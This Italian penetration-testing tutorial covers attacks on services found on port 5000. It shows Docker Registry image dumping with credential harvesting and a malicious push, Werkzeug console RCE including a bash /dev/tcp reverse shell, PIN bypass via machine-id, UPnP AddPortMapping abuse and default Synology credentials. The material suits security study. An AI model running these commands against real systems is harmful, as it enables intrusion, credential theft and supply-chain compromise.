---
title: 'Porta 5000: Docker Registry, Flask Debug e UPnP'
slug: porta-5000-upnp-flask-docker-registry
description: 'Porta 5000 nel pentest: riconosci Docker Registry, Flask debug, UPnP o Synology DSM. Enumerazione, image pull, RCE Werkzeug e abuse SOAP in lab.'
image: /porta-5000-upnp-flask-docker-registry.webp
draft: true
date: 2026-04-11T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - Docker Registry
  - Werkzeug Debugger
  - UPnP
---

La porta 5000 TCP è una delle porte più ambigue nel penetration testing: può ospitare almeno tre servizi completamente diversi, ognuno con vettori di attacco propri. **Docker Registry** (il più critico) espone le immagini container con credenziali e codice sorgente, **Flask** in debug mode offre RCE diretta tramite la Werkzeug debugger console e **UPnP** (Universal Plug and Play) espone interfacce SOAP per il controllo di dispositivi di rete. Identificare correttamente quale servizio gira sulla 5000 è il primo step — da lì si apre un percorso di exploitation specifico per ciascuno.

Nel 2026, il servizio più comunemente trovato sulla porta 5000 in ambienti enterprise è il Docker Registry privato. In ambienti di sviluppo è Flask. In reti domestiche e IoT è UPnP.

## Come Distinguere i Tre Servizi

```bash
# Step 1: Banner grab
curl -s http://10.10.10.40:5000/ -I
```

| Risposta                                            | Servizio                           |
| --------------------------------------------------- | ---------------------------------- |
| `Docker-Distribution-Api-Version: registry/2.0`     | **Docker Registry**                |
| `Server: Werkzeug` oppure HTML con Python traceback | **Flask (debug mode)**             |
| XML con `<root xmlns="urn:schemas-upnp-org:...">`   | **UPnP**                           |
| `404 Not Found` senza header caratteristici         | Potrebbe essere qualsiasi — indaga |

```bash
# Nmap per identificare
nmap -sV -p 5000 --script=http-headers 10.10.10.40
```

***

## Scenario 1: Docker Registry (il più critico)

Docker Registry è un servizio che archivia e distribuisce immagini container Docker. La porta 5000 è la porta di default per il registry privato. Senza autenticazione (il default), chiunque può scaricare le immagini — che contengono codice sorgente, credenziali, chiavi API e configurazioni dell'applicazione.

### Verifica che sia Docker Registry

```bash
curl -s http://10.10.10.40:5000/v2/
```

```json
{}
```

Risposta vuota `{}` con status 200 → Docker Registry v2 senza autenticazione.

Se ricevi `401 Unauthorized` → auth è attiva. Prova credenziali default:

```bash
curl -s -u "admin:admin" http://10.10.10.40:5000/v2/
curl -s -u "registry:registry" http://10.10.10.40:5000/v2/
```

### Enumerazione immagini

```bash
# Lista tutti i repository (immagini)
curl -s http://10.10.10.40:5000/v2/_catalog
```

```json
{
  "repositories": [
    "webapp-prod",
    "api-backend",
    "internal-tools",
    "ml-pipeline"
  ]
}
```

Quattro immagini nel registry. Ora enumera i tag (versioni) di ciascuna:

```bash
# Tag di webapp-prod
curl -s http://10.10.10.40:5000/v2/webapp-prod/tags/list
```

```json
{
  "name": "webapp-prod",
  "tags": ["latest", "v2.3.1", "v2.3.0", "v2.2.0"]
}
```

### Scaricare un'immagine (il loot principale)

```bash
# Configura Docker per usare il registry insecure (HTTP)
# /etc/docker/daemon.json:
# {"insecure-registries": ["10.10.10.40:5000"]}
# systemctl restart docker

docker pull 10.10.10.40:5000/webapp-prod:latest
```

```bash
# Oppure senza Docker — scarica i layer manualmente
# Ottieni il manifest
curl -s http://10.10.10.40:5000/v2/webapp-prod/manifests/latest
```

```bash
# Il manifest contiene i digest dei layer — scaricali
curl -s http://10.10.10.40:5000/v2/webapp-prod/blobs/sha256:abc123... -o layer1.tar.gz
tar xzf layer1.tar.gz -C /tmp/image_contents/
```

### Analisi dell'immagine

```bash
# Esplora il filesystem dell'immagine
docker save 10.10.10.40:5000/webapp-prod:latest -o webapp.tar
mkdir /tmp/webapp && tar xf webapp.tar -C /tmp/webapp/

# Cerca credenziali
grep -riE "password|secret|token|api_key|jdbc|mongodb|redis" /tmp/webapp/ 2>/dev/null | head -50
```

```bash
# Cerca .env files
find /tmp/webapp -name ".env" -o -name ".env.*" -exec cat {} \; 2>/dev/null
```

```
DB_HOST=db-prod.corp.internal
DB_PASSWORD=Pr0d_DB_2025!
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/...
REDIS_URL=redis://:RedisP@ss@10.10.10.50:6379
```

Credenziali per [MySQL](https://hackita.it/articoli/porta-3306-mysql), [Redis](https://hackita.it/articoli/porta-6379-redis), [AWS](https://hackita.it/articoli/aws-privilege-escalation).

```bash
# History dei layer (rivela comandi del Dockerfile)
docker history 10.10.10.40:5000/webapp-prod:latest --no-trunc
```

```
COPY ./config/prod.env /app/.env
RUN echo "DB_PASSWORD=Pr0d_DB_2025!" >> /app/.env
ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/...
```

I comandi `ENV` e `RUN` nel Dockerfile possono contenere credenziali — visibili nella history anche se il file è stato rimosso nei layer successivi.

### Push malevolo (se hai write access)

Se il registry non richiede auth per il push:

```bash
# Crea un'immagine malevola con lo stesso nome
docker build -t 10.10.10.40:5000/webapp-prod:latest .
docker push 10.10.10.40:5000/webapp-prod:latest
```

Se l'infrastruttura fa `docker pull` automatico (CI/CD, Kubernetes), la tua immagine viene deployata al posto di quella legittima — supply chain attack.

### Tool dedicati

```bash
# DockerRegistryGrabber
python3 DockerGraber.py http://10.10.10.40 --dump_all

# Skopeo (senza Docker daemon)
skopeo inspect docker://10.10.10.40:5000/webapp-prod:latest
skopeo copy docker://10.10.10.40:5000/webapp-prod:latest dir:/tmp/image/
```

***

## Scenario 2: Flask Debug Mode (RCE diretta)

Flask è il microframework web Python più usato. In development mode, serve sulla porta 5000 con la Werkzeug debugger console — un interprete Python interattivo nel browser. Se esposta in produzione (errore sorprendentemente comune), è **RCE immediata**: esegui codice Python arbitrario direttamente dalla pagina web.

### Identificare Flask debug mode

```bash
curl -s http://10.10.10.40:5000/
```

Se vedi la pagina di default Flask oppure un errore con traceback Python e la scritta "Werkzeug Debugger" → Flask in debug mode.

```bash
# Provoca un errore per vedere il debugger
curl -s http://10.10.10.40:5000/nonexistent_page_xyz
```

Se la risposta include `Traceback (most recent call last)` con un'interfaccia interattiva → debug mode attivo.

### Werkzeug Debugger Console — RCE

```bash
# La console è spesso su /console
curl -s http://10.10.10.40:5000/console
```

Se la console è protetta da PIN, il PIN è generabile con informazioni dal server (MAC address, machine-id). Se non è protetta → RCE diretta:

```python
# Nella console Werkzeug (via browser):
import os; os.popen('id').read()
```

```
'uid=1001(flask) gid=1001(flask) groups=1001(flask)\n'
```

```python
# Reverse shell
import os; os.system("bash -c 'bash -i >& /dev/tcp/10.10.10.200/4444 0>&1'")
```

### Bypass del PIN Werkzeug

Il PIN è calcolato da: username, modname, appname, percorso dell'app, MAC address (come int) e machine-id. Se hai LFI o accesso parziale:

```bash
# MAC address
cat /sys/class/net/eth0/address
# → aa:bb:cc:dd:ee:ff → converti in int

# Machine ID
cat /etc/machine-id
# oppure
cat /proc/sys/kernel/random/boot_id
```

Con questi dati, script pubblici generano il PIN.

### Informazioni dall'errore Flask

Anche senza la console, il traceback Python espone:

* **Path del filesystem**: `/opt/app/main.py`, `/home/flask/webapp/`
* **Versioni Python e librerie**: Python 3.11, Flask 3.0
* **Codice sorgente** delle righe vicine all'errore
* **Variabili locali** al momento dell'errore (possono contenere credenziali)

### Flask senza debug mode

Se Flask non è in debug mode ma è esposto sulla 5000:

* Testa per [SQL injection](https://hackita.it/articoli/sqlmap) nei parametri
* Testa per SSTI (Server-Side Template Injection): `{{7*7}}` nei parametri
* Directory bruteforce con [Gobuster](https://hackita.it/articoli/web-pentest)

***

## Scenario 3: UPnP (Universal Plug and Play)

UPnP sulla porta 5000 è tipico di dispositivi di rete (router, NAS Synology, media server). L'interfaccia SOAP permette di controllare i dispositivi senza autenticazione.

### Identificare UPnP

```bash
curl -s http://10.10.10.40:5000/
```

Se la risposta è XML con namespace `urn:schemas-upnp-org:` → UPnP.

```bash
# Description document
curl -s http://10.10.10.40:5000/description.xml
```

```xml
<root xmlns="urn:schemas-upnp-org:device-1-0">
  <device>
    <deviceType>urn:schemas-upnp-org:device:InternetGatewayDevice:1</deviceType>
    <friendlyName>CorpRouter</friendlyName>
    <manufacturer>Netgear</manufacturer>
    <modelName>R7000</modelName>
    <serialNumber>ABC123456</serialNumber>
  </device>
</root>
```

**Intelligence:** è un Netgear R7000 (cerca CVE), modello specifico, serial number.

### UPnP SOAP exploitation

```bash
# Aggiungi port forward (apri porte sul router!)
curl -s -X POST http://10.10.10.40:5000/ctl/IPConn \
  -H "SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping" \
  -d '<?xml version="1.0"?>
  <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
    <s:Body>
      <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
        <NewRemoteHost></NewRemoteHost>
        <NewExternalPort>4444</NewExternalPort>
        <NewProtocol>TCP</NewProtocol>
        <NewInternalPort>22</NewInternalPort>
        <NewInternalClient>192.168.1.100</NewInternalClient>
        <NewEnabled>1</NewEnabled>
        <NewPortMappingDescription>test</NewPortMappingDescription>
        <NewLeaseDuration>0</NewLeaseDuration>
      </u:AddPortMapping>
    </s:Body>
  </s:Envelope>'
```

Questo apre la porta 4444 esterna e la redirige alla porta 22 (SSH) di un host interno 192.168.1.100 → accesso SSH dall'esterno a un host interno senza VPN.

### Synology NAS sulla porta 5000

Synology DSM (DiskStation Manager) usa la porta 5000 (HTTP) e 5001 (HTTPS) per l'interfaccia web di amministrazione del NAS:

```bash
curl -s http://10.10.10.40:5000/ -I | grep Server
```

```
Server: nginx (Synology DSM)
```

Se è Synology:

* Testa credenziali default: `admin:admin`, `admin:synology`
* Cerca CVE per la versione DSM
* L'interfaccia dà accesso a: file, backup, utenti, servizi di rete, Docker (se installato)

***

## Riepilogo: Identificazione e Attacco

| Identificazione                          | Servizio           | Primo attacco                     |
| ---------------------------------------- | ------------------ | --------------------------------- |
| Header `Docker-Distribution-Api-Version` | Docker Registry    | `curl /v2/_catalog` → pull images |
| `Server: Werkzeug` o traceback Python    | Flask debug        | `/console` → Python RCE           |
| XML UPnP / `urn:schemas-upnp-org`        | UPnP               | SOAP AddPortMapping               |
| `Server: nginx (Synology DSM)`           | Synology NAS       | Default creds `admin:admin`       |
| JSON API non riconosciuta                | Flask/FastAPI prod | SSTI, SQLi, directory brute       |

## Cheat Sheet Finale

| Azione              | Comando                                          |
| ------------------- | ------------------------------------------------ |
| Identificazione     | `curl -s http://target:5000/ -I`                 |
| **Docker Registry** |                                                  |
| Lista immagini      | `curl -s http://target:5000/v2/_catalog`         |
| Lista tag           | `curl -s http://target:5000/v2/IMAGE/tags/list`  |
| Pull                | `docker pull target:5000/IMAGE:TAG`              |
| Cerca credenziali   | `grep -riE "password\|secret" /tmp/image/`       |
| History             | `docker history target:5000/IMAGE --no-trunc`    |
| **Flask**           |                                                  |
| Console             | `curl -s http://target:5000/console`             |
| RCE                 | `import os; os.popen('id').read()` nella console |
| SSTI test           | `curl "http://target:5000/page?name={{7*7}}"`    |
| **UPnP**            |                                                  |
| Description         | `curl -s http://target:5000/description.xml`     |
| Port forward        | SOAP `AddPortMapping`                            |
| **Synology**        |                                                  |
| Default creds       | `admin:admin`, `admin:synology`                  |

***

Riferimento: Docker Registry API v2, Werkzeug debugger security, UPnP SOAP exploitation, HackTricks. Uso esclusivo in ambienti autorizzati.

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
